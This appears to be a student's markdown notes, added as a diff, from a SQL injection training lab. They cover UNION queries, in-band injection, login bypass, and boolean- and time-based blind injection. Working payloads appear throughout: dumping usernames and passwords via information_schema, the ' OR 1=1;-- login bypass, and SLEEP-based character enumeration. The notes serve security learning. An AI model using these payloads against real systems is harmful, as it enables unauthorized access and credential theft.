@@ -1,0 +1,132 @@
+# SQL Injection
+
+## TASK 3 SQL Union
+
+UNION
+    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables. The rules for this query are:
+
+    1. The UNION statement must retrieve the same number of columns in each SELECT statement.
+    2. The columns must be of a similar data type.
+    3. The column order must be the same.
+
+    For example, consider a company that wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have two tables:
+
+    **Customers Table:**
+
+    | id | name             | address           | city       | postcode |
+    |----|------------------|-------------------|------------|----------|
+    | 1  | Mr John Smith    | 123 Fake Street   | Manchester | M2 3FJ   |
+    | 2  | Mrs Jenny Palmer | 99 Green Road     | Birmingham | B2 4KL   |
+    | 3  | Miss Sarah Lewis | 15 Fore Street    | London     | NW12 3GH |
+
+    **Suppliers Table:**
+
+    | id | company           | address                  | city       | postcode |
+    |----|-------------------|--------------------------|------------|----------|
+    | 1  | Widgets Ltd       | Unit 1a, Newby Estate   | Bristol    | BS19 4RT |
+    | 2  | The Tool Company  | 75 Industrial Road      | Norwich    | N22 3DR  |
+    | 3  | Axe Makers Ltd    | 2b Makers Unit, Market Road | London | SE9 1KK  |
+
+    Using the following SQL statement, we can gather the results from the two tables and combine them into one result set:
+
+    SELECT name, address, city, postcode FROM customers 
+    UNION 
+    SELECT company AS name, address, city, postcode FROM suppliers;
+
+    -- Result:
+    | Name              | Address                  | City        | Postcode |
+    |-------------------|--------------------------|-------------|----------|
+    | Mr John Smith     | 123 Fake Street          | Manchester  | M2 3FJ   |
+    | Mrs Jenny Palmer  | 99 Green Road            | Birmingham  | B2 4KL   |
+    | Miss Sarah Lewis  | 15 Fore Street           | London      | NW12 3GH |
+    | Widgets Ltd       | Unit 1a, Newby Estate    | Bristol     | BS19 4RT |
+    | The Tool Company  | 75 Industrial Road       | Norwich     | N22 3DR  |
+    | Axe Makers Ltd    | 2b Makers Unit, Market Road | London  | SE9 1KK  |
+
+## TASK 5 In-Band SQLi
+In-Band SQL Injection is the simplest to detect and exploit. 
+It uses the same communication channel to exploit the vulnerability and retrieve results. 
+
+    Start with:
+        1 UNION SELECT 1
+    If it errors, keep add columns until we match the col number:
+        1 UNION SELECT 1,2
+        1 UNION SELECT 1,2,3
+    To avoid displaying the article, set the ID to 0:
+        0 UNION SELECT 1,2,3
+    Replace column values with useful data, e.g., database name:
+        0 UNION SELECT 1,2,database()
+    To list tables in the database:
+        0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+    To find the structure of the `staff_users` table:
+        0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+    To retrieve usernames and passwords:
+        0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+## TASK Blind SQLi - Authentication Bypass
+
+Blind SQLi
+    Blind SQL Injection occurs when error messages are disabled, and we get minimal feedback, yet the injection still works. 
+    Even with limited feedback, it's possible to enumerate the database.
+
+Authentication Bypass
+    Blind SQLi can bypass login forms by crafting queries that always return true. Instead of finding valid credentials, we manipulate the query logic.
+
+    Example:
+    A login form query:
+        `SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;`
+    Injecting `' OR 1=1;--` into the password field modifies it to:
+        `SELECT * FROM users WHERE username='' AND password='' OR 1=1;`
+    Since `1=1` is always true, the query bypasses authentication.
+
+## TASK 7 Blind SQLi - Boolean Based
+
+Boolean Based
+    Boolean-based SQL Injection uses true/false responses to confirm if an injection payload is successful. 
+    Despite limited feedback, it can enumerate database structures and contents.
+
+    1.  On level three of the SQL Injection Examples Machine, the URL is:
+            https://website.thm/checkuser?username=admin
+
+    2.   The browser body shows `{"taken":true}` for `admin` and `{"taken":false}` for `admin123`. The query:
+            `SELECT * FROM users WHERE username='%username%' LIMIT 1;`
+
+    3.  To find the number of columns:
+            `admin123' UNION SELECT 1;--` (false)
+            `admin123' UNION SELECT 1,2,3;--` (true)
+
+    4.  To find the database name:
+            `admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--`
+        Cycle through characters to find `sqli_three`.
+
+    5.  To find table names:
+            `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'a%';--`
+        Cycle through characters to find `users`.
+
+    6.  To find column names:
+            `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' AND TABLE_NAME='users' AND COLUMN_NAME LIKE 'a%';--`
+        Cycle to find `id`, `username`, `password`.
+
+    7.  To find username:
+            `admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--`
+        Find `admin`.
+
+    8.  To find password:
+            `admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--`
+        Find `3845`.
+
+## TASK 8 Blind SQLi - Time Based
+
+Time-Based
+    Time-based Blind SQLi introduces a delay using methods like SLEEP(x) to confirm successful queries. The delay occurs only when the UNION SELECT statement executes successfully.
+
+    1.  To find the number of columns:
+            admin123' UNION SELECT SLEEP(5);-- (no delay)
+            admin123' UNION SELECT SLEEP(5),2;-- (5-second delay confirms 2 columns)
+
+    2.  Repeat the enumeration process from Boolean-based SQLi, adding SLEEP() to UNION SELECT.
+
+    3.  Hint: To find the table name
+            referrer=admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
+
+## Appendix:
